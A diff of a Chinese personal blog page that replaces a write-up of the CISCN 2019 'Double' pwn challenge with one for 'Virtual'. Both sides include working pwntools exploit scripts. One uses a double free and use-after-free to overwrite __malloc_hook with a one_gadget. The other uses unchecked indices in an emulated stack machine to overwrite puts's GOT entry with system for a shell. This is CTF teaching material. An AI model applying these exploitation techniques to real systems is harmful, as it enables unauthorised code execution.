@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="介绍仍然是国赛2019的一道题，正如它的名字，是一个double free，不过漏洞不那么容易看出来（虽然我是一下子就看出来了）。">
+  <meta name="description" content="介绍国赛2019的一道题，虚拟了stack和buffer，所以利用方式比较神奇。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn2019-Double">
-<meta property="og:url" content="https://mf-x.github.io/2019/05/03/ciscn2019-Double/index.html">
+<meta property="og:title" content="ciscn2019-Virtual">
+<meta property="og:url" content="https://mf-x.github.io/2019/05/03/ciscn2019-Virtual/index.html">
 <meta property="og:site_name" content="ivan">
-<meta property="og:description" content="介绍仍然是国赛2019的一道题，正如它的名字，是一个double free，不过漏洞不那么容易看出来（虽然我是一下子就看出来了）。">
+<meta property="og:description" content="介绍国赛2019的一道题，虚拟了stack和buffer，所以利用方式比较神奇。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-02T16:27:38.747Z">
+<meta property="og:updated_time" content="2019-05-03T16:39:53.830Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ciscn2019-Double">
-<meta name="twitter:description" content="介绍仍然是国赛2019的一道题，正如它的名字，是一个double free，不过漏洞不那么容易看出来（虽然我是一下子就看出来了）。">
+<meta name="twitter:title" content="ciscn2019-Virtual">
+<meta name="twitter:description" content="介绍国赛2019的一道题，虚拟了stack和buffer，所以利用方式比较神奇。">
 
 
 
 
 
 
-  <link rel="canonical" href="https://mf-x.github.io/2019/05/03/ciscn2019-Double/">
+  <link rel="canonical" href="https://mf-x.github.io/2019/05/03/ciscn2019-Virtual/">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>ciscn2019-Double | ivan</title>
+  <title>ciscn2019-Virtual | ivan</title>
   
 
 
@@ -329,7 +329,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/03/ciscn2019-Double/">
+    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/03/ciscn2019-Virtual/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ivan Mo">
@@ -346,7 +346,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ciscn2019-Double
+          <h1 class="post-title" itemprop="name headline">ciscn2019-Virtual
               
             
           </h1>
@@ -371,12 +371,24 @@
                 
               
 
-              <time title="Created: 2019-05-03 00:01:15 / Modified: 00:27:38" itemprop="dateCreated datePublished" datetime="2019-05-03T00:01:15+08:00">2019-05-03</time>
+              <time title="Created: 2019-05-03 23:53:07" itemprop="dateCreated datePublished" datetime="2019-05-03T23:53:07+08:00">2019-05-03</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-05-04 00:39:53" itemprop="dateModified" datetime="2019-05-04T00:39:53+08:00">2019-05-04</time>
               
             
           </span>
@@ -409,17 +421,34 @@
       
 
       
-        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>仍然是国赛2019的一道题，正如它的名字，是一个double free，不过漏洞不那么容易看出来（虽然我是一下子就看出来了）。</p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>国赛2019的一道题，虚拟了stack和buffer，所以利用方式比较神奇。</p>
 <a id="more"></a>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>还是一个单选程序，可以增加，查看，编辑，删除。处理的是一个单链表，结构体如下。有两个全局变量指向链表头和尾。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x18, mappedto_6)</span><br><span class="line">00000000 index           dd ?</span><br><span class="line">00000004 size            dd ?</span><br><span class="line">00000008 content_addr    dq ?                    ; offset</span><br><span class="line">00000010 nextNode        dq ?                    ; offset</span><br><span class="line">00000018 node            ends</span><br></pre></td></tr></table></figure>
-<p>其中漏洞在new的时候，当new一个新node的时，读入content后，会与上一次的content做比较，如果相同则无需开辟新空间，直接将指针指过去就好。因此，虽然在free时有将指针清零，但有可能有多个指针指向一个堆块，所以会造成double free，其实因为还有edit操作，所以我们可以直接UAF，即可分配堆到我们想要的地方。</p>
-<p>（这大概就是所谓的优化带来的bug吧）</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ol>
-<li>malloc两个content相同的smallbin，并free掉其中一个，content上就会有libc的地址，利用另一个node打印出来即可造成信息泄漏。</li>
-<li>再次malloc两个content相同的smallbin，free其中一个，再利用另一个node去改写fd的值，导致下一次malloc的地址可控，malloc到<code>__malloc_hook</code>附近，然后将<code>__malloc_hook</code>填为onegadget即可。</li>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序模拟了三个部分text代码段，stack栈，buffer缓冲区。</p>
+<p>其中text和stack是用户自定义的。</p>
+<p>代码有以下几种：</p>
+<ol>
+<li><p><code>push</code> 将stack上值取出放入buffer中</p>
+</li>
+<li><p><code>pop</code> 将buffer上值取出放入stack中</p>
+</li>
+<li><p><code>add/sub/mul/div</code> 从buffer取出两个值，相加/减/乘/除后放回buffer中</p>
+</li>
+<li><p><code>load</code> 从buffer中读入一个值作为index，将buffer中这个index所对应位置的值写入buffer中</p>
+</li>
+<li><p><code>save</code> 从buffer中读入一个值作为index，再从buffer中读一个值，写入buffer中这个index所对应的位置   </p>
+</li>
 </ol>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn'</span></span><br><span class="line">lib = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">p = process(binary)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Your data:'</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">'Success, index: '</span>)</span><br><span class="line">    idx = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Info index: '</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Info index: '</span>,idx)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Info index: '</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">200</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">200</span>) <span class="comment"># 1</span></span><br><span class="line">delete(<span class="string">'0'</span>)</span><br><span class="line">show(<span class="string">'1'</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">libc.address = leak - (<span class="number">0x7f77a0c73b78</span> - <span class="number">0x7f77a08af000</span>)</span><br><span class="line">p.info(<span class="string">'libc.address: %s'</span> % hex(libc.address))</span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">200</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">100</span>) <span class="comment"># 3</span></span><br><span class="line">new(<span class="string">'1'</span>*<span class="number">100</span>) <span class="comment"># 4</span></span><br><span class="line">delete(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'4'</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">35</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="string">'2'</span>*<span class="number">100</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address +  <span class="number">0x4526a</span></span><br><span class="line">payload = (cyclic(<span class="number">0x13</span>) + p64(one_gadget)).ljust(<span class="number">100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">new(payload) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>很明显的看出load和save的时候，没有对index做检查，所以可以造成buffer周围的任意读写，我们分一下几步来完成攻击。</p>
+<ol>
+<li>修改模拟stack的位置到got表上。</li>
+<li>push，将got上<code>puts</code>函数的地址的值放入buffer中</li>
+<li>sub，将<code>puts</code>函数的地址改为<code>system</code>函数的地址</li>
+<li>pop，将<code>system</code>函数的地址写回got表上<code>puts</code>的位置</li>
+<li>program name设为’/bin/sh’，输出程序名的时候即可getshell</li>
+</ol>
+<p>稍微解释一下exp中的攻击指令和stack上的值。<br><code>push</code> 将stack上第一个值（puts和system的偏移）放入buffer中<br><code>push</code> 将stack上第二个值（got表中puts函数的位置）放入buffer中<br><code>push</code> 将stack上第三个值（buffer相对于模拟的stack的地址的偏移，因为堆上面是保存了模拟的stack的地址的）放入buffer中<br><code>save</code> 将相对于模拟stack的偏移读出，再将got表位置读出，然后将模拟的stack的地址改为got表，现在模拟的stack就被改到got表上了<br><code>push</code> 将模拟栈上的值写入buffer中，因为栈现在在got表上，所以会将puts的地址写到buffer上<br><code>sub</code> 将puts和system的偏移读出，将puts的地址读出，做减法，再写回buffer上，此时buffer上就只有一个system的地址<br><code>pop</code> 读出buffer上system的地址，写会模拟stack上，因为模拟stack现在在got表上，所以将puts的地址改为了system的地址</p>
+<p>模拟stack上第四个值为9999是因为push是会检查栈是否为空。检查方式为读入模拟stack中数据时会有一个变量记录一共读入了多少个数据，每次push都会减1，所以我们只要多读入几个数据即可让这个变量不减为0。</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn'</span></span><br><span class="line">lib = <span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span></span><br><span class="line">p = process(binary)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.sendline(<span class="string">'push push push save push sub pop'</span>)</span><br><span class="line"></span><br><span class="line">offset = libc.symbols[<span class="string">'_IO_puts'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'%d %d -208 99999'</span> % (offset, elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -447,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/02/ciscn2019-your-pwn/" rel="next" title="ciscn2019-your_pwn">
-                <i class="fa fa-chevron-left"></i> ciscn2019-your_pwn
+              <a href="/2019/05/03/ciscn2019-Double/" rel="next" title="ciscn2019-Double">
+                <i class="fa fa-chevron-left"></i> ciscn2019-Double
               </a>
             
           </div>
@@ -456,10 +485,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/03/ciscn2019-Virtual/" rel="prev" title="ciscn2019-Virtual">
-                ciscn2019-Virtual <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
